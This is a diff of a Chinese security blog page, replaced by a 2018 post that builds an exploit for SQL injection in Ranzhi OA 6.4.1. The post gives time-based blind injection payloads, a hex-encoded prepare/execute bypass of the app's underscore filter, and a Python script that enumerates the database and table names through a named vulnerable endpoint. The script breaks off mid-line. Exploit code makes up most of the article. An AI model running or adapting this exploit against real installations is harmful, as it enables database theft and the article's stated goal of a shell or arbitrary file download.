@@ -46,7 +46,7 @@
     
     <title>
         
-            标签: awd | 
+            然之协同系统6.4.1 SQL注入之exp编写 | 
         
         穷则变，变则通，通则久
     </title>
@@ -58,7 +58,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="hac425">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="">
+    <meta name="keywords" content=",sqli">
 
     <!-- Import lsloader -->
     <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
@@ -240,15 +240,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://blog.hac425.top">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="标签: awd | 穷则变，变则通，通则久">
+    <meta property="og:title" content="然之协同系统6.4.1 SQL注入之exp编写 | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
     <meta property="og:description" content="">
-    
+    <meta property="og:article:tag" content="sqli"> 
 
+    
+        <meta property="article:published_time" content="Tue Mar 13 2018 13:02:00 GMT+0800" />
+        <meta property="article:modified_time" content="Tue Mar 13 2018 13:24:37 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="标签: awd | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="然之协同系统6.4.1 SQL注入之exp编写 | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -256,13 +259,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://blog.hac425.top/tags/awd/index.html" />
+        <link rel="canonical" href="http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html",
+    "headline": "然之协同系统6.4.1 SQL注入之exp编写",
+    "datePublished": "Tue Mar 13 2018 13:02:00 GMT+0800",
+    "dateModified": "Tue Mar 13 2018 13:24:37 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",sqli",
+    "description": "",
+}
+</script>
 
 
     
@@ -305,98 +338,303 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li></ol>
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/12/23/defense_pwn_with_ld_preload.html">使用LD_PRELOAD防御pwn</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            前言本文介绍使用 ...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/12/23/defense_pwn_with_ld_preload.html" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/girl.png" width="44px" height="44px" alt="hac425's avatar">
-            </div>
-            <div>
-                <strong>hac425</strong>
-                <span>12月 23, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-          
-              <!-- Category -->
-              <span class="post_entry-category">
-                  <a class="post_category-link" href="/categories/ctf/">ctf</a>
-              </span>
-            
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                然之协同系统6.4.1 SQL注入之exp编写
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>3月 13, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACa0lEQVR42u3aQXLDIBAEQP//08kDUrZnFpDlVOukSlkSzQHI7D5+/vX1wMPDw8PDw8PDuxnvEV9/n3p2n/z+7y+fPVWPDQ8PD+8S3puldsRrn3p9X4wNDw8P70JesmS/3gZmC/3KxOHh4eF9Iy95T7LcbzuI4+Hh4d2Y1x5284gBDw8P71t4yUCTg3Jy4E6+/oGsBQ8PDy/mrSzWp+8vre/h4eHhBby6pSmeglkrwOamKzw8PLwDvHwhnjUB5G97PU35RODh4eFdw5uV/2fBQRHIBl8v/mPAw8PD28prA9mViZhNbl6Ew8PDwzvNWylHrUe9xaDXY1w8PDy8rbz1Alhb4M8bFNqoFw8PD+80bxYuzILX/LCexBN1ZwQeHh7eJt7rA+4smJhtDLOprPc9PDw8vGVePty2SNZuMCvNB3h4eHjX89pIIi9xtaFtvkVtaB3Aw8PDG/FmAcT6pjKLKo7X9/Dw8PBGvLZFdaU8lkcY25qu8PDw8A60q54eetugkG8JeHh4eNfwdiFXwoX8mL7UU4aHh4e3iZcswe0H2sU9D3mj8hseHh7eh3htUNsemvNtoB0DHh4e3qd4bStVHijk70y2Kzw8PLw78OrXLcS1swP3mynDw8PDO8xrr1lUkW8Y+Rvqpis8PDy8TbxHfK1sBrPhbmu6wsPDwzvAy0tZySDyOGPvdODh4eFdz2sX6JWSVT5BdXsWHh4e3hfykr+0B+gbbQx4eHh4m0KB2dG8bWJYah3Aw8PDO8DLmwNWAoi8YNYGFnh4eHhX8toIoJ2I5D3binB4eHh4h3n/78LDw8PDw8PDw7vB9Qv5J+05k5GhSwAAAABJRU5ErkJggg==">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/sqli/">sqli</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=然之协同系统6.4.1 SQL注入之exp编写&url=http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=然之协同系统6.4.1 SQL注入之exp编写&url=http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面已经说明了 漏洞成因，这里介绍一下 <code>exp</code> 的编写。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>为了 <code>getshell</code> 或者是 <code>任意文件下载</code>， 我们需要修改 数据库中的 <code>前缀sys_file</code> 表， 所以我们的利用方式如下</p>
+<ul>
+<li>使用 <code>sql</code> 注入 获取程序数据库中任何一个表名, 取得前缀 <code>pre</code></li>
+<li>然后向 <code>presys_file</code> 中插入目标路径。</li>
+</ul>
+<p>在 <code>mysql 5</code> 中可以使用 <code>information_schema</code>  来获取指定数据库中的表。</p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520917684557luzl95cc.png?imageslim" alt="paste image"></p>
+<p>在  <code>information_schema</code>   中的 <code>tables</code> 表里面存放着整个 <code>mysql</code> 里面保存的表的信息， <code>table_schema</code> 为 表所在的数据库， <code>table_name</code> 为表名。</p>
+<p>所以使用 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT table_name FROM information_schema.tables where table_schema=database()</div></pre></td></tr></table></figure>
+<p>就可以得到 当前数据库的 所有表的表名（<code>database()</code> 返回当前的数据库名称）。</p>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520917953978x0ig1jny.png?imageslim" alt="paste image"></p>
+<p>由于没有回显，需要使用一些 <code>条件判断</code> 相关的函数，这里我使用 <code>if</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select if(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1) ,1 ,1))=16, SLEEP(3), 1)</div></pre></td></tr></table></figure>
+<p><code>if</code> 的第一参数为 <code>1</code> 则返回第二个参数的值，否则返回 第3个参数的值.</p>
+<p>上面的语句用到了子查询和 <code>acsii</code>， <code>substr</code> 来对检索到的结果根据其 <code>ascii</code> 值进行枚举，如果枚举到了，就 <code>sleep(3)</code>。</p>
+<p>我们可以通过判断服务器的响应时间，来判断当前枚举位的具体值。</p>
+<p>同时子查询只允许返回一行，所以使用 了 <code>limit 0,1</code> 来只返回第一条结果。</p>
+<p>枚举表名的关键代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">table_name = &quot;&quot;</div><div class="line">for i in range(1, table_len + 1):</div><div class="line">    for j in range(1, 129):</div><div class="line">        payload = get_payload_encode(</div><div class="line">            &apos;&apos;&apos;select if(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1) ,&#123;&#125; ,1))=&#123;&#125;, SLEEP(3), 1);&apos;&apos;&apos;.format(</div><div class="line">                i, j))</div><div class="line"></div><div class="line">        start = time.time()</div><div class="line">        requests.get(host)</div><div class="line">        nor_time = (time.time() - start)</div><div class="line"></div><div class="line">        start = time.time()</div><div class="line">        requests.get(target + payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies)</div><div class="line">        att_time = (time.time() - start)</div><div class="line">        if att_time - nor_time &gt; 2:</div><div class="line">            table_name += chr(j)</div><div class="line">            print(table_name)</div><div class="line">            break</div></pre></td></tr></table></figure>
+<p>还有一个注意的就是，程序过滤了 <code>_</code>, 这里使用 <code>prepare</code> 和 <code>execute</code> 组合进行绕过，因为 <code>mysql</code> 支持字符串使用 <code>16</code> 进制编码输入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def get_payload_encode(payload):</div><div class="line">    sql = &quot;set @query=0x&#123;&#125;;prepare stmt from @query;execute stmt;&quot;.format(binascii.b2a_hex(payload.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;))</div><div class="line">    raw = &#123;&quot;orderBy&quot;: &quot;id limit 0,1;&#123;&#125;#&quot;.format(sql)&#125;</div><div class="line">    raw = json.dumps(raw)</div><div class="line">    return base64.b64encode(raw.encode(&quot;utf-8&quot;))  # str---&gt; byte   用 encode</div></pre></td></tr></table></figure>
+<p><img src="http://7xr0vd.dl1.z0.glb.clouddn.com/1520918666562del8q6uc.png?imageslim" alt="paste image"></p>
+<p>最后的 <code>exp</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line">import requests</div><div class="line">import base64</div><div class="line">import time</div><div class="line">import json</div><div class="line">import binascii</div><div class="line"></div><div class="line"></div><div class="line">def get_payload_encode(payload):</div><div class="line">    sql = &quot;set @query=0x&#123;&#125;;prepare stmt from @query;execute stmt;&quot;.format(binascii.b2a_hex(payload.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;))</div><div class="line">    raw = &#123;&quot;orderBy&quot;: &quot;id limit 0,1;&#123;&#125;#&quot;.format(sql)&#125;</div><div class="line">    raw = json.dumps(raw)</div><div class="line">    return base64.b64encode(raw.encode(&quot;utf-8&quot;))  # str---&gt; byte   用 encode</div><div class="line"></div><div class="line"></div><div class="line">def make_payload():</div><div class="line">    pass</div><div class="line"></div><div class="line"></div><div class="line">proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, &#125;</div><div class="line"></div><div class="line">cookies = &#123;&quot;lang&quot;: &quot;zh-cn&quot;, &quot;theme&quot;: &quot;default&quot;, &quot;keepLogin&quot;: &quot;false&quot;, &quot;rid&quot;: &quot;6n6panbh36uqiqj4k5o0nbscq2&quot;,</div><div class="line">           &quot; XDEBUG_SESSION&quot;: &quot;19857&quot;&#125;</div><div class="line">headers = &#123;&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</div><div class="line">           &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;,</div><div class="line">           &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,</div><div class="line">           &quot;Referer&quot;: &quot;http://hack.ranzhi.top/sys/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</div><div class="line">           &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;</div><div class="line"></div><div class="line">host = &quot;http://hack.ranzhi.top:80/&quot;</div><div class="line"></div><div class="line"></div><div class="line">def get_db_name(host):</div><div class="line">    path = &quot;/cash/block-printTradeBlock.html?param=&quot;</div><div class="line">    target = host + path</div><div class="line">    db_len = 0</div><div class="line">    for i in range(1, 100):</div><div class="line">        payload = get_payload_encode(&apos;&apos;&apos;SELECT if(LENGTH(DATABASE())=&#123;&#125;, sleep(3), 1);&apos;&apos;&apos;.format(i))</div><div class="line">        start = time.time()</div><div class="line">        requests.get(host)</div><div class="line">        nor_time = (time.time() - start)</div><div class="line"></div><div class="line">        start = time.time()</div><div class="line">        requests.get(target + payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies, proxies=proxies)</div><div class="line">        att_time = (time.time() - start)</div><div class="line"></div><div class="line">        if att_time - nor_time &gt; 2:</div><div class="line">            db_len = i</div><div class="line">            break</div><div class="line">    print(&quot;db_len: %d&quot; % (db_len))</div><div class="line">    # 获取数据库名称</div><div class="line">    base_sql = &apos;&apos;&apos;SELECT if(ASCII(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;, sleep(3), 1);&apos;&apos;&apos;</div><div class="line">    db_name = &quot;&quot;</div><div class="line">    for i in range(db_len, db_len + 1):</div><div class="line">        for j in range(65, 128):</div><div class="line">            payload = get_payload_encode(base_sql.format(&apos;select database()&apos;, i, j))</div><div class="line">            start = time.time()</div><div class="line">            requests.get(host)</div><div class="line">            nor_time = (time.time() - start)</div><div class="line"></div><div class="line">            start = time.time()</div><div class="line">            requests.get(target + payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies, proxies=proxies)</div><div class="line">            att_time = (time.time() - start)</div><div class="line"></div><div class="line">            if att_time - nor_time &gt; 2:</div><div class="line">                db_name += chr(j)</div><div class="line">                print(db_name)</div><div class="line">                break</div><div class="line"></div><div class="line"></div><div class="line"># get_db_name(host)</div><div class="line"></div><div class="line"></div><div class="line">def get_table_name(host):</div><div class="line">    path = &quot;/cash/block-printTradeBlock.html?param=&quot;</div><div class="line">    target = host + path</div><div class="line">    # 查表名</div><div class="line">    table_len = 0</div><div class="line">    for i in range(1, 100):</div><div class="line">        payload = get_payload_encode(</div><div class="line">            &apos;&apos;&apos;select if((SELECT LENGTH(table_name)FROM information_schema.tables where table_schema=database() LIMIT 0,1)=&#123;&#125;, SLEEP(3), 1);&apos;&apos;&apos;.format(</div><div class="line">                i))</div><div class="line">        start = time.time()</div><div class="line">        requests.get(host)</div><div class="line">        nor_time = (time.time() - start)</div><div class="line"></div><div class="line">        start = time.time()</div><div class="line">        requests.get(target + 